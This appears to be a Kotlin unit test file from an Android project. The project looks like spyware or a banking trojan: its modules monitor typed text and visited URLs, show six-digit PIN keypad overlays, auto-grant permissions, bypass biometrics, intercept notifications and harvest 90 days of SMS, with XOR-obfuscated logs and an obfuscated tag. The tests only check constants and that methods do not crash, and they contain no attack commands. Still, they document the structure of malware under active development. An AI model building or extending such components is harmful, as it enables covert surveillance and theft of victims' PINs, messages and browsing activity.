package com.storm.safe.rock.service.modules

import android.os.Build
import android.util.Base64
import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * Tests for Batch C — Middle Managers
 *
 * Covers:
 * - ActivityMonitor (XOR encrypt/decrypt, log buffering)
 * - OverlayWindowManager (layout constants)
 * - OverlayDialogHelper (layout constants)
 * - PermissionAutoGrantDelegate (browser URL bar map, text collection)
 * - ConfigProgressManager (brand detection, authorization flow)
 * - BiometricBypassDelegate (component selection)
 * - NotificationInterceptDelegate (node finding, recording state)
 * - SmsInterceptDelegate (SMS type mapping)
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class MiddleManagersTest {

    // ===================================================================
    // ActivityMonitor — XOR encrypt/decrypt
    // ===================================================================

    @Test
    fun `xorEncrypt and xorDecrypt are inverse operations`() {
        val original = "Hello, World! 测试中文"
        val key = "testKey12345678901234567890"
        val encrypted = ActivityMonitor.xorEncrypt(original, key)
        assertNotEquals(original, encrypted) // encrypted differs
        val decrypted = ActivityMonitor.xorDecrypt(encrypted, key)
        assertEquals(original, decrypted)
    }

    @Test
    fun `xorEncrypt returns base64 encoded string`() {
        val encrypted = ActivityMonitor.xorEncrypt("test", "key123")
        // Should be valid base64 — no exception on decode
        val decoded = Base64.decode(encrypted, Base64.DEFAULT)
        assertNotNull(decoded)
        assertTrue(decoded.isNotEmpty())
    }

    @Test
    fun `xorDecrypt with wrong key produces different result`() {
        val original = "secret message"
        val encrypted = ActivityMonitor.xorEncrypt(original, "correctKey1234567890")
        val wrongDecrypted = ActivityMonitor.xorDecrypt(encrypted, "wrongKey1234567890abc")
        assertNotEquals(original, wrongDecrypted)
    }

    @Test
    fun `xorEncrypt handles empty string`() {
        val encrypted = ActivityMonitor.xorEncrypt("", "key123")
        val decrypted = ActivityMonitor.xorDecrypt(encrypted, "key123")
        assertEquals("", decrypted)
    }

    // ===================================================================
    // ActivityMonitor — addLog / log buffering
    // ===================================================================

    @Test
    fun `addLog does not crash with null-safe enum and string`() {
        // Static method, should not crash even without a callback
        ActivityMonitor.addLog(ActivityMonitor.LogType.ACTIVITY, "test entry")
    }

    @Test
    fun `flushLogs does not crash when buffer is empty`() {
        ActivityMonitor.flushLogs()
    }

    @Test
    fun `LogType enum has expected values`() {
        val values = ActivityMonitor.LogType.values()
        assertTrue(values.size >= 5)
        assertNotNull(ActivityMonitor.LogType.ACTIVITY)
        assertNotNull(ActivityMonitor.LogType.TEXT_EVENT)
        assertNotNull(ActivityMonitor.LogType.URL)
        assertNotNull(ActivityMonitor.LogType.APP_USAGE)
        assertNotNull(ActivityMonitor.LogType.FOCUS)
    }

    @Test
    fun `logActivity delegates to writeToFile`() {
        // Should not crash
        ActivityMonitor.logActivity("WINDOW_STATE_CHANGED")
    }

    @Test
    fun `logSystem includes timestamp format`() {
        // Should not crash
        ActivityMonitor.logSystem("test system event")
    }

    // ===================================================================
    // ActivityMonitor — Feature flags
    // ===================================================================

    @Test
    fun `feature flags are true by default`() {
        assertTrue(ActivityMonitor.textMonitorEnabled)
        assertTrue(ActivityMonitor.appUsageEnabled)
        assertTrue(ActivityMonitor.urlMonitorEnabled)
        assertTrue(ActivityMonitor.focusMonitorEnabled)
    }

    // ===================================================================
    // OverlayWindowManager — construction & dp conversion
    // ===================================================================

    @Test
    fun `OverlayWindowManager can be instantiated`() {
        // Just verify the class exists and the constant fields
        assertEquals(6, OverlayWindowManager.PASSWORD_LENGTH)
        assertEquals("#80000000", OverlayWindowManager.OVERLAY_BG_COLOR)
    }

    @Test
    fun `OverlayWindowManager KEYPAD_LAYOUT has 4 rows`() {
        assertEquals(4, OverlayWindowManager.KEYPAD_LAYOUT.size)
        assertEquals(3, OverlayWindowManager.KEYPAD_LAYOUT[0].size)
        assertEquals("DEL", OverlayWindowManager.KEYPAD_LAYOUT[3][2])
    }

    // ===================================================================
    // OverlayDialogHelper — construction & constants
    // ===================================================================

    @Test
    fun `OverlayDialogHelper has correct constants`() {
        assertEquals(6, OverlayDialogHelper.PASSWORD_LENGTH)
        assertEquals("#111111", OverlayDialogHelper.TITLE_COLOR)
        assertEquals("#E5E7EB", OverlayDialogHelper.KEYPAD_BG_COLOR)
    }

    @Test
    fun `OverlayDialogHelper KEYPAD_LAYOUT matches OverlayWindowManager`() {
        assertEquals(4, OverlayDialogHelper.KEYPAD_LAYOUT.size)
        assertEquals("0", OverlayDialogHelper.KEYPAD_LAYOUT[3][1])
    }

    // ===================================================================
    // PermissionAutoGrantDelegate — browser URL bar IDs
    // ===================================================================

    @Test
    fun `BROWSER_URL_BAR_IDS contains Chrome`() {
        val map = PermissionAutoGrantDelegate.BROWSER_URL_BAR_IDS
        assertTrue(map.containsKey("com.android.chrome"))
        assertEquals("com.android.chrome:id/url_bar", map["com.android.chrome"])
    }

    @Test
    fun `BROWSER_URL_BAR_IDS contains 10 browsers`() {
        val map = PermissionAutoGrantDelegate.BROWSER_URL_BAR_IDS
        assertEquals(10, map.size)
        assertTrue(map.containsKey("org.mozilla.firefox"))
        assertTrue(map.containsKey("com.brave.browser"))
        assertTrue(map.containsKey("com.duckduckgo.mobile.android"))
    }

    @Test
    fun `collectNodeTexts returns empty list for null depth`() {
        val list = ArrayList<String>()
        PermissionAutoGrantDelegate.collectNodeTexts(0, null, list)
        assertTrue(list.isEmpty())
    }

    // ===================================================================
    // DeviceAuthorizationManager — brand detection
    // ===================================================================

    @Test
    fun `detectBrand returns non-null for known manufacturers`() {
        // This is a static method — we can test its logic
        // (Build.BRAND/MANUFACTURER are set by Robolectric to "robolectric")
        // Just verify it doesn't crash
        val brand = DeviceAuthorizationManager.detectBrand()
        // Robolectric returns "robolectric" for brand, so may be null
        // That's fine — we're testing the method doesn't crash
    }

    @Test
    fun `isInProgress returns false initially`() {
        val manager = DeviceAuthorizationManager()
        assertFalse(manager.isInProgress())
    }

    // ===================================================================
    // BiometricBypassDelegate — component name selection
    // ===================================================================

    @Test
    fun `BiometricBypassDelegate constants are defined`() {
        assertEquals("fxsnugkm", BiometricBypassDelegate.TAG)
    }

    // ===================================================================
    // NotificationInterceptDelegate — findNodeById
    // ===================================================================

    @Test
    fun `findNodeById returns null for null root`() {
        val result = NotificationInterceptDelegate.findNodeById(null, "some:id")
        assertNull(result)
    }

    // ===================================================================
    // SmsInterceptDelegate — SMS type mapping
    // ===================================================================

    @Test
    fun `smsTypeToString maps correctly`() {
        assertEquals("inbox", SmsInterceptDelegate.smsTypeToString(1))
        assertEquals("sent", SmsInterceptDelegate.smsTypeToString(2))
        assertEquals("draft", SmsInterceptDelegate.smsTypeToString(3))
        assertEquals("outbox", SmsInterceptDelegate.smsTypeToString(4))
        assertEquals("failed", SmsInterceptDelegate.smsTypeToString(5))
        assertEquals("queued", SmsInterceptDelegate.smsTypeToString(6))
        assertEquals("unknown", SmsInterceptDelegate.smsTypeToString(99))
    }

    @Test
    fun `SmsInterceptDelegate SYNC_PERIOD_MS is 90 days`() {
        assertEquals(7776000000L, SmsInterceptDelegate.SYNC_PERIOD_MS)
    }
}
